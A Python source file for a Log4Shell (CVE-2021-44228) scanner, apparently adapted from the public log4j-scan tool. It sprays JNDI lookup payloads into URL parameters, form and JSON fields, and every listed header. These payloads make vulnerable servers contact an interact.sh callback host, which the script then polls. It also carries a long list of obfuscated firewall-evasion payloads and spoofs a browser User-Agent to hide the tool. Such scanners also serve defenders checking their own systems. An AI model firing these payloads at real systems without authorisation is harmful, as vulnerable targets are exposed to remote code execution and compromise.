import argparse
import random
import requests
import time
import sys
from urllib import parse as urlparse
import base64
import json
from uuid import uuid4
from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from termcolor import cprint

# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)

default_headers = {
    #'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
}

post_data_parameters = ["username", "user", "uname", "name", "email", "email_address", "password"]
timeout = 4

waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
                       "${jndi:rmi://{{callback_host}}/{{random}}}",
                       "${jndi:rmi://{{callback_host}}}/",
                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://{{callback_host}}/{{random}}}",
                       "${jndi:dns://{{callback_host}}/{{random}}}",
                       "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}",
                       "${jndi:dns://{{callback_host}}}",
                       "${j${k8s:k5:-ND}i:ldap://{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{random}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
                       "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
                       ]

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="send requests through proxy",
                    action='store')
parser.add_argument("--request-type",
                    dest="request_type",
                    help="Request Type: (get, post) - [Default: get].",
                    default="get",
                    action='store')
parser.add_argument("--headers-file",
                    dest="headers_file",
                    help="Headers fuzzing list - [default: headers.txt].",
                    default="headers.txt",
                    action='store')
parser.add_argument("--exclude-user-agent-fuzzing",
                    dest="exclude_user_agent_fuzzing",
                    help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                    action='store_true')
parser.add_argument("--waf-bypass",
                    dest="waf_bypass_payloads",
                    help="Extend scans with WAF bypass payloads.",
                    action='store_true')
parser.add_argument("--dns-callback-provider",
                    dest="dns_callback_provider",
                    help="DNS Callback provider [Default: interact.sh].",
                    default="interact.sh",
                    action='store')
parser.add_argument("--custom-dns-callback-host",
                    dest="custom_dns_callback_host",
                    help="Custom DNS Callback Host.",
                    action='store')

args = parser.parse_args()

proxies = {}
if args.proxy:
    proxies = {"http": args.proxy, "https": args.proxy}

def get_fuzzing_headers(payload):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    with open(args.headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.update({i: payload})
    if args.exclude_user_agent_fuzzing:
        fuzzing_headers["User-Agent"] = default_headers["User-Agent"]

    if "Referer" in fuzzing_headers:
        fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    return fuzzing_headers

def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data

def generate_waf_bypass_payloads(callback_host, random_string):
    payloads = []
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads

class Interactsh:
    # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
    def __init__(self, token="", server=""):
        rsa = RSA.generate(2048)
        self.public_key = rsa.publickey().exportKey()
        self.private_key = rsa.exportKey()
        self.token = token
        self.server = server.lstrip('.') or 'interact.sh'
        self.headers = {
            "Content-Type": "application/json",
        }
        if self.token:
            self.headers['Authorization'] = self.token
        self.secret = str(uuid4())
        self.encoded = b64encode(self.public_key).decode("utf8")
        guid = uuid4().hex.ljust(33, 'a')
        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
        self.domain = f'{guid}.{self.server}'
        self.correlation_id = self.domain[:20]

        self.session = requests.session()
        self.session.headers = self.headers
        self.session.verify = False
        self.session.proxies = proxies
        self.register()

    def register(self):
        data = {
            "public-key": self.encoded,
            "secret-key": self.secret,
            "correlation-id": self.correlation_id
        }
        res = self.session.post(
            f"https://{self.server}/register", headers=self.headers, json=data, timeout=30)
        if 'success' not in res.text:
            raise Exception("Can not initiate interact.sh DNS callback client")

    def pull_logs(self):
        result = []
        url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
        res = self.session.get(url, headers=self.headers, timeout=30).json()
        aes_key, data_list = res['aes_key'], res['data']
        for i in data_list:
            decrypt_data = self.__decrypt_data(aes_key, i)
            result.append(self.__parse_log(decrypt_data))
        return result

    def __decrypt_data(self, aes_key, data):
        private_key = RSA.importKey(self.private_key)
        cipher = PKCS1_OAEP.new(private_key, hashAlgo=SHA256)
        aes_plain_key = cipher.decrypt(base64.b64decode(aes_key))
        decode = base64.b64decode(data)
        bs = AES.block_size
        iv = decode[:bs]
        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=iv, segment_size=128)
        plain_text = cryptor.decrypt(decode)
        return json.loads(plain_text[16:])

    def __parse_log(self, log_entry):
        new_log_entry = {"timestamp": log_entry["timestamp"],
                         "host": f'{log_entry["full-id"]}.{self.domain}',
                         "remote_address": log_entry["remote-address"]
                         }
        return new_log_entry

def parse_url(url):
    """
    Parses the URL.
    """
    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})

def scan_url(url, callback_host):
    parsed_url = parse_url(url)
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
    payloads = [payload]
    if args.waf_bypass_payloads:
        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))

    for payload in payloads:
        cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")

        if args.request_type.upper() == "GET":
            try:
                requests.request(url=url,
                                 method="GET",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 verify=False,
                                 timeout=timeout,
                                 proxies=proxies)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")

        if args.request_type.upper() == "POST" :
            try:
                # Post body
                requests.request(url=url,
                                 method="POST",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 data=get_fuzzing_post_data(payload),
                                 verify=False,
                                 timeout=timeout,
                                 proxies=proxies)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")

            try:
                # JSON body
                requests.request(url=url,
                                 method="POST",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 json=get_fuzzing_post_data(payload),
                                 verify=False,
                                 timeout=timeout,
                                 proxies=proxies)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")

def main():
    urls = []
    if args.url:
        urls.append(args.url)

        if args.dns_callback_provider == "interact.sh":
            dns_callback = Interactsh()
        else:
            raise ValueError("Invalid DNS Callback provider")
        dns_callback_host = dns_callback.domain

    for url in urls:
        cprint(f"[•] URL: {url}", "magenta")
        scan_url(url, dns_callback_host)

    records = dns_callback.pull_logs()
    if len(records) == 0:
        cprint("[•] Targets do not seem to be vulnerable.", "green")
    else:
        cprint("[!!!] Targets Affected", "yellow")
        for i in records:
            cprint(json.dumps(i), "yellow")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
